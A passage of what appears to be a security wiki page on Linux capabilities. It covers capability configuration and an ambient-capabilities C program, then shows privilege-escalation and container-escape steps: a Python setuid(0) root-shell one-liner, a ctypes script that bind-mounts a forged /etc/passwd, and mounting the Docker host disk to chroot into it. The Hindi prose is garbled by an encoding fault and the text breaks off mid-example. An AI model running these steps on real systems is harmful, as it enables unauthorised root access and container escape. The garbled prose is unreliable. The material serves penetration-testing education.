рд╕реНрдкрд╖реНрдЯ рд░реВрдк рд╕реЗ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛рдУрдВ рдХреЛ рдХреНрд╖рдорддрд╛рдПрдБ рд╕реМрдВрдкрдирд╛ рд╕рдВрднрд╡ рд╣реИ**ред рдЗрд╕рдХрд╛ рдорддрд▓рдм рд╢рд╛рдпрдж рдпрд╣ рд╣реИ рдХрд┐ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рджреНрд╡рд╛рд░рд╛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдкреНрд░рддреНрдпреЗрдХ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреА рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдЧреАред\
[рдЗрд╕](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7) рдкрд░ рдЖрдзрд╛рд░рд┐рдд, [рдЗрд╕ ](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) рдФрд░ [рдЗрд╕ ](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user) рдкрд░ рдХреБрдЫ рдлрд╝рд╛рдЗрд▓реЗрдВ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХреА рдЬрд╛рдиреА рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдирд┐рд╢реНрдЪрд┐рдд рдХреНрд╖рдорддрд╛рдПрдБ рджреА рдЬрд╛ рд╕рдХреЗрдВ, рд▓реЗрдХрд┐рди рдкреНрд░рддреНрдпреЗрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдХреНрд╖рдорддрд╛рдПрдБ рд╕реМрдВрдкрдиреЗ рд╡рд╛рд▓реА рдлрд╝рд╛рдЗрд▓ `/etc/security/capability.conf` рд╣реЛрдЧреАред\
рдлрд╝рд╛рдЗрд▓ рдХрд╛ рдЙрджрд╛рд╣рд░рдг:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## Environment Capabilities

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рд╕рдВрдХрд▓рд┐рдд рдХрд░рдХреЗ **рдПрдХ рдРрд╕реЗ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рдЕрдВрджрд░ рдПрдХ рдмреИрд╢ рд╢реЗрд▓ рдЙрддреНрдкрдиреНрди рдХрд░рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИ**ред

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% endcode %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
Inside the **bash executed by the compiled ambient binary** рдЗрд╕реЗ рджреЗрдЦрдирд╛ рд╕рдВрднрд╡ рд╣реИ **рдирдИ рдХреНрд╖рдорддрд╛рдПрдБ** (рдПрдХ рд╕рд╛рдорд╛рдиреНрдп рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЗ рдкрд╛рд╕ "рд╡рд░реНрддрдорд╛рди" рдЕрдиреБрднрд╛рдЧ рдореЗрдВ рдХреЛрдИ рдХреНрд╖рдорддрд╛ рдирд╣реАрдВ рд╣реЛрдЧреА)ред
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
рдЖрдк **рдХреЗрд╡рд▓ рдЙрди рдХреНрд╖рдорддрд╛рдУрдВ рдХреЛ рдЬреЛрдбрд╝ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ** рдЕрдиреБрдордд рдФрд░ рд╡рд┐рд░рд╛рд╕рдд рдореЗрдВ рдорд┐рд▓рдиреЗ рд╡рд╛рд▓реЗ рд╕реЗрдЯ рджреЛрдиреЛрдВ рдореЗрдВ рдореМрдЬреВрдж рд╣реИрдВред
{% endhint %}

### рдХреНрд╖рдорддрд╛-рдЬрд╛рдирдХрд╛рд░реА/рдХреНрд╖рдорддрд╛-рдЧреВрдВрдЧреЗ рдмрд╛рдЗрдирд░реА

**рдХреНрд╖рдорддрд╛-рдЬрд╛рдирдХрд╛рд░реА рдмрд╛рдЗрдирд░реА рдирдП рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рдЙрдкрдпреЛрдЧ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреА** рдЬреЛ рд╡рд╛рддрд╛рд╡рд░рдг рджреНрд╡рд╛рд░рд╛ рджреА рдЧрдИ рд╣реИрдВ, рд╣рд╛рд▓рд╛рдБрдХрд┐ **рдХреНрд╖рдорддрд╛-рдЧреВрдВрдЧреЗ рдмрд╛рдЗрдирд░реА рдЙрдирдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░реЗрдВрдЧреА** рдХреНрдпреЛрдВрдХрд┐ рд╡реЗ рдЙрдиреНрд╣реЗрдВ рдЕрд╕реНрд╡реАрдХрд╛рд░ рдирд╣реАрдВ рдХрд░реЗрдВрдЧреАред рдпрд╣ рдХреНрд╖рдорддрд╛-рдЧреВрдВрдЧреЗ рдмрд╛рдЗрдирд░реА рдХреЛ рдПрдХ рд╡рд┐рд╢реЗрд╖ рд╡рд╛рддрд╛рд╡рд░рдг рдХреЗ рднреАрддрд░ рдХрдордЬреЛрд░ рдмрдирд╛рддрд╛ рд╣реИ рдЬреЛ рдмрд╛рдЗрдирд░реА рдХреЛ рдХреНрд╖рдорддрд╛рдПрдБ рдкреНрд░рджрд╛рди рдХрд░рддрд╛ рд╣реИред

## рд╕реЗрд╡рд╛ рдХреНрд╖рдорддрд╛рдПрдБ

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдПрдХ **рд╕реЗрд╡рд╛ рдЬреЛ рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓ рд░рд╣реА рд╣реИ, рд╕рднреА рдХреНрд╖рдорддрд╛рдПрдБ рдЕрд╕рд╛рдЗрди рдХреА рдЧрдИ рд╣реЛрдВрдЧреА**, рдФрд░ рдХреБрдЫ рдЕрд╡рд╕рд░реЛрдВ рдкрд░ рдпрд╣ рдЦрддрд░рдирд╛рдХ рд╣реЛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕рд▓рд┐рдП, рдПрдХ **рд╕реЗрд╡рд╛ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░реЗрд╢рди** рдлрд╝рд╛рдЗрд▓ рдЖрдкрдХреЛ **рдирд┐рд░реНрдзрд╛рд░рд┐рдд** рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддреА рд╣реИ рдХрд┐ рдЖрдк рдЗрд╕реЗ рдХреМрди рд╕реА **рдХреНрд╖рдорддрд╛рдПрдБ** рджреЗрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ, **рдФрд░** рд╡рд╣ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛** рдЬреЛ рд╕реЗрд╡рд╛ рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рд┐рдП рддрд╛рдХрд┐ рдЕрдирд╛рд╡рд╢реНрдпрдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ рдХреЗ рд╕рд╛рде рд╕реЗрд╡рд╛ рди рдЪрд▓рд╛рдИ рдЬрд╛ рд╕рдХреЗ:
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Capabilities in Docker Containers

рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ, рдбреЙрдХрд░ рдХреБрдЫ рдХреНрд╖рдорддрд╛рдПрдБ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЛ рдЕрд╕рд╛рдЗрди рдХрд░рддрд╛ рд╣реИред рдпрд╣ рдЬрд╛рдВрдЪрдирд╛ рдмрд╣реБрдд рдЖрд╕рд╛рди рд╣реИ рдХрд┐ рдпреЗ рдХреНрд╖рдорддрд╛рдПрдБ рдХреМрди рд╕реА рд╣реИрдВ, рдмрд╕ рдпрд╣ рдЪрд▓рд╛рдХрд░:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

тАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛтАЛ[**RootedCON**](https://www.rootedcon.com/) **рд╕реНрдкреЗрди** рдореЗрдВ рд╕рдмрд╕реЗ рдкреНрд░рд╛рд╕рдВрдЧрд┐рдХ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдХрд╛рд░реНрдпрдХреНрд░рдо рд╣реИ рдФрд░ **рдпреВрд░реЛрдк** рдореЗрдВ рд╕рдмрд╕реЗ рдорд╣рддреНрд╡рдкреВрд░реНрдг рдореЗрдВ рд╕реЗ рдПрдХ рд╣реИред **рддрдХрдиреАрдХреА рдЬреНрдЮрд╛рди рдХреЛ рдмрдврд╝рд╛рд╡рд╛ рджреЗрдиреЗ** рдХреЗ рдорд┐рд╢рди рдХреЗ рд╕рд╛рде, рдпрд╣ рдХрд╛рдВрдЧреНрд░реЗрд╕ рд╣рд░ рдЕрдиреБрд╢рд╛рд╕рди рдореЗрдВ рдкреНрд░реМрджреНрдпреЛрдЧрд┐рдХреА рдФрд░ рд╕рд╛рдЗрдмрд░рд╕реБрд░рдХреНрд╖рд╛ рдкреЗрд╢реЗрд╡рд░реЛрдВ рдХреЗ рд▓рд┐рдП рдПрдХ рдЙрд╖реНрдгрдХрдЯрд┐рдмрдВрдзреАрдп рдмреИрдардХ рд╕реНрдерд▓ рд╣реИред

{% embed url="https://www.rootedcon.com/" %}

## Privesc/Container Escape

Capabilities рддрдм рдЙрдкрдпреЛрдЧреА рд╣реЛрддреА рд╣реИрдВ рдЬрдм рдЖрдк **рд╡рд┐рд╢рд┐рд╖реНрдЯ рд╕рдВрдЪрд╛рд▓рди рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж рдЕрдкрдиреЗ рд╕реНрд╡рдпрдВ рдХреЗ рдкреНрд░рдХреНрд░рд┐рдпрд╛рдУрдВ рдХреЛ рдкреНрд░рддрд┐рдмрдВрдзрд┐рдд рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ** (рдЬреИрд╕реЗ chroot рд╕реЗрдЯ рдХрд░рдиреЗ рдФрд░ рдПрдХ рд╕реЙрдХреЗрдЯ рд╕реЗ рдмрд╛рдЗрдВрдб рдХрд░рдиреЗ рдХреЗ рдмрд╛рдж)ред рд╣рд╛рд▓рд╛рдБрдХрд┐, рдЗрдиреНрд╣реЗрдВ рджреБрд░реНрднрд╛рд╡рдирд╛рдкреВрд░реНрдг рдХрдорд╛рдВрдб рдпрд╛ рддрд░реНрдХреЛрдВ рдХреЛ рдкрд╛рд╕ рдХрд░рдХреЗ рд╢реЛрд╖рд┐рдд рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдЬрд┐рдиреНрд╣реЗрдВ рдлрд┐рд░ root рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓рд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред

рдЖрдк `setcap` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдкрд░ capabilities рдХреЛ рдордЬрдмреВрд░ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдФрд░ рдЗрдиреНрд╣реЗрдВ `getcap` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдкреВрдЫ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep` рдХрд╛ рдорддрд▓рдм рд╣реИ рдХрд┐ рдЖрдк рдХреНрд╖рдорддрд╛ рдЬреЛрдбрд╝ рд░рд╣реЗ рд╣реИрдВ (тАЬ-тАЭ рдЗрд╕реЗ рд╣рдЯрд╛ рджреЗрдЧрд╛) рдЬреЛ рдкреНрд░рднрд╛рд╡реА рдФрд░ рдЕрдиреБрдордд рд╣реИред

рд╕рд┐рд╕реНрдЯрдо рдпрд╛ рдлрд╝реЛрд▓реНрдбрд░ рдореЗрдВ рдХреНрд╖рдорддрд╛рдУрдВ рд╡рд╛рд▓реЗ рдХрд╛рд░реНрдпрдХреНрд░рдореЛрдВ рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП:
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

рдирд┐рдореНрдирд▓рд┐рдЦрд┐рдд рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдмрд╛рдЗрдирд░реА `/usr/bin/python2.6` рдкреНрд░рд┐рд╡реЗрд╕реНрдХ рдХреЗ рд▓рд┐рдП рдХрдордЬреЛрд░ рдкрд╛рдИ рдЬрд╛рддреА рд╣реИ:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**Capabilities** рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ `tcpdump` рджреНрд╡рд╛рд░рд╛ **рдХрд┐рд╕реА рднреА рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдкреИрдХреЗрдЯреНрд╕ рдХреЛ рд╕реНрдирд┐рдлрд╝ рдХрд░рдиреЗ рдХреА рдЕрдиреБрдорддрд┐ рджреЗрдиреЗ рдХреЗ рд▓рд┐рдП**:
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "рдЦрд╛рд▓реА" рдХреНрд╖рдорддрд╛рдУрдВ рдХрд╛ рд╡рд┐рд╢реЗрд╖ рдорд╛рдорд▓рд╛

[рджрд╕реНрддрд╛рд╡реЗрдЬрд╝ рд╕реЗ](https://man7.org/linux/man-pages/man7/capabilities.7.html): рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ рдХрд┐рд╕реА рдкреНрд░реЛрдЧреНрд░рд╛рдо рдлрд╝рд╛рдЗрд▓ рдХреЛ рдЦрд╛рд▓реА рдХреНрд╖рдорддрд╛ рд╕реЗрдЯ рд╕реМрдВрдкрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ, рдФрд░ рдЗрд╕ рдкреНрд░рдХрд╛рд░ рдПрдХ рд╕реЗрдЯ-рдпреВрдЬрд╝рд░-рдЖрдИрдбреА-рд░реВрдЯ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдмрдирд╛рдирд╛ рд╕рдВрднрд╡ рд╣реИ рдЬреЛ рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдкреНрд░рднрд╛рд╡реА рдФрд░ рд╕рд╣реЗрдЬреЗ рдЧрдП рд╕реЗрдЯ-рдпреВрдЬрд╝рд░-рдЖрдИрдбреА рдХреЛ 0 рдореЗрдВ рдмрджрд▓ рджреЗрддрд╛ рд╣реИ рдЬреЛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреЛ рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рддрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЙрд╕ рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЛ рдХреЛрдИ рдХреНрд╖рдорддрд╛рдПрдБ рдирд╣реАрдВ рджреЗрддрд╛ред рдпрд╛, рд╕рд░рд▓ рд╢рдмреНрджреЛрдВ рдореЗрдВ, рдпрджрд┐ рдЖрдкрдХреЗ рдкрд╛рд╕ рдПрдХ рдмрд╛рдЗрдирд░реА рд╣реИ рдЬреЛ:

1. рд░реВрдЯ рджреНрд╡рд╛рд░рд╛ рд╕реНрд╡рд╛рдорд┐рддреНрд╡ рдореЗрдВ рдирд╣реАрдВ рд╣реИ
2. рдХреЛрдИ `SUID`/`SGID` рдмрд┐рдЯ рд╕реЗрдЯ рдирд╣реАрдВ рд╣реИ
3. рдЦрд╛рд▓реА рдХреНрд╖рдорддрд╛рдПрдБ рд╕реЗрдЯ рд╣реИрдВ (рдЬреИрд╕реЗ: `getcap myelf` `myelf =ep` рд▓реМрдЯрд╛рддрд╛ рд╣реИ)

рддреЛ **рд╡рд╣ рдмрд╛рдЗрдирд░реА рд░реВрдЯ рдХреЗ рд░реВрдк рдореЗрдВ рдЪрд▓реЗрдЧреА**ред

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)** рдПрдХ рдЕрддреНрдпрдзрд┐рдХ рд╢рдХреНрддрд┐рд╢рд╛рд▓реА Linux рдХреНрд╖рдорддрд╛ рд╣реИ, рдЬрд┐рд╕реЗ рдЕрдХреНрд╕рд░ рдЗрд╕рдХреЗ рд╡реНрдпрд╛рдкрдХ **рдкреНрд░рд╢рд╛рд╕рдирд┐рдХ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░реЛрдВ** рдХреЗ рдХрд╛рд░рдг рд▓рдЧрднрдЧ рд░реВрдЯ рд╕реНрддрд░ рдХреЗ рдмрд░рд╛рдмрд░ рдорд╛рдирд╛ рдЬрд╛рддрд╛ рд╣реИ, рдЬреИрд╕реЗ рдХрд┐ рдЙрдкрдХрд░рдгреЛрдВ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдирд╛ рдпрд╛ рдХрд░реНрдиреЗрд▓ рд╕реБрд╡рд┐рдзрд╛рдУрдВ рдореЗрдВ рд╣реЗрд░рдлреЗрд░ рдХрд░рдирд╛ред рдЬрдмрдХрд┐ рд╕рдВрдкреВрд░реНрдг рд╕рд┐рд╕реНрдЯрдо рдХрд╛ рдЕрдиреБрдХрд░рдг рдХрд░рдиреЗ рд╡рд╛рд▓реЗ рдХрдВрдЯреЗрдирд░реЛрдВ рдХреЗ рд▓рд┐рдП рдпрд╣ рдЕрдирд┐рд╡рд╛рд░реНрдп рд╣реИ, **`CAP_SYS_ADMIN` рдорд╣рддреНрд╡рдкреВрд░реНрдг рд╕реБрд░рдХреНрд╖рд╛ рдЪреБрдиреМрддрд┐рдпрд╛рдБ рдкреНрд░рд╕реНрддреБрдд рдХрд░рддрд╛ рд╣реИ**, рд╡рд┐рд╢реЗрд╖ рд░реВрдк рд╕реЗ рдХрдВрдЯреЗрдирд░рдпреБрдХреНрдд рд╡рд╛рддрд╛рд╡рд░рдг рдореЗрдВ, рдЗрд╕рдХреЗ рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рд╡реГрджреНрдзрд┐ рдФрд░ рд╕рд┐рд╕реНрдЯрдо рд╕рдордЭреМрддреЗ рдХреА рд╕рдВрднрд╛рд╡рдирд╛рдУрдВ рдХреЗ рдХрд╛рд░рдгред рдЗрд╕рд▓рд┐рдП, рдЗрд╕рдХреЗ рдЙрдкрдпреЛрдЧ рдХреЗ рд▓рд┐рдП рдХрдареЛрд░ рд╕реБрд░рдХреНрд╖рд╛ рдЖрдХрд▓рдиреЛрдВ рдФрд░ рд╕рддрд░реНрдХ рдкреНрд░рдмрдВрдзрди рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реЛрддреА рд╣реИ, рдЬрд┐рд╕рдореЗрдВ **рдХрдо рд╕реЗ рдХрдо рд╡рд┐рд╢реЗрд╖рд╛рдзрд┐рдХрд╛рд░ рдХреЗ рд╕рд┐рджреНрдзрд╛рдВрдд** рдХрд╛ рдкрд╛рд▓рди рдХрд░рдиреЗ рдФрд░ рд╣рдорд▓реЗ рдХреА рд╕рддрд╣ рдХреЛ рдХрдо рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдкреНрд▓рд┐рдХреЗрд╢рди-рд╡рд┐рд╢рд┐рд╖реНрдЯ рдХрдВрдЯреЗрдирд░реЛрдВ рдореЗрдВ рдЗрд╕ рдХреНрд╖рдорддрд╛ рдХреЛ рдЫреЛрдбрд╝рдиреЗ рдХреА рдордЬрдмреВрдд рдкреНрд░рд╛рдердорд┐рдХрддрд╛ рд╣реЛрддреА рд╣реИред

**рдмрд╛рдЗрдирд░реА рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
python рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ рдЖрдк рдЕрд╕рд▓реА _passwd_ рдлрд╝рд╛рдЗрд▓ рдХреЗ рдКрдкрд░ рдПрдХ рд╕рдВрд╢реЛрдзрд┐рдд _passwd_ рдлрд╝рд╛рдЗрд▓ рдорд╛рдЙрдВрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
рдФрд░ рдЕрдВрдд рдореЗрдВ **mount** рдХрд┐рдП рдЧрдП рд╕рдВрд╢реЛрдзрд┐рдд `passwd` рдлрд╝рд╛рдЗрд▓ рдХреЛ `/etc/passwd` рдкрд░:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
рдФрд░ рдЖрдк рдкрд╛рд╕рд╡рд░реНрдб "password" рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ **`su` as root** рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рд╣реЛрдВрдЧреЗред

**рдкрд░реНрдпрд╛рд╡рд░рдг рдХреЗ рд╕рд╛рде рдЙрджрд╛рд╣рд░рдг (Docker рдмреНрд░реЗрдХрдЖрдЙрдЯ)**

рдЖрдк рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЗ рдЕрдВрджрд░ рд╕рдХреНрд╖рдо рдХреНрд╖рдорддрд╛рдУрдВ рдХреА рдЬрд╛рдВрдЪ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ:
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
Inside the previous output you can see that the SYS\_ADMIN capability is enabled.

* **Mount**

рдпрд╣ рдбреЙрдХрд░ рдХрдВрдЯреЗрдирд░ рдХреЛ **рд╣реЛрд╕реНрдЯ рдбрд┐рд╕реНрдХ рдХреЛ рдорд╛рдЙрдВрдЯ рдХрд░рдиреЗ рдФрд░ рдЗрд╕реЗ рд╕реНрд╡рддрдВрддреНрд░ рд░реВрдк рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рджреЗрддрд╛ рд╣реИ:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **рдкреВрд░реНрдг рдкрд╣реБрдБрдЪ**

рдкрд┐рдЫрд▓реА рд╡рд┐рдзрд┐ рдореЗрдВ рд╣рдордиреЗ рдбреЙрдХрд░ рд╣реЛрд╕реНрдЯ рдбрд┐рд╕реНрдХ рддрдХ рдкрд╣реБрдБрдЪ рдкреНрд░рд╛рдкреНрдд рдХреАред\
рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рд╣реЛрд╕реНрдЯ рдПрдХ **ssh** рд╕рд░реНрд╡рд░ рдЪрд▓рд╛ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк **рдбреЙрдХрд░ рд╣реЛрд╕реНрдЯ** рдбрд┐рд╕реНрдХ рдХреЗ рдЕрдВрджрд░ рдПрдХ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдмрдирд╛ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ SSH рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрд╕ рддрдХ рдкрд╣реБрдБрдЪ рд╕рдХрддреЗ рд╣реИрдВ:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
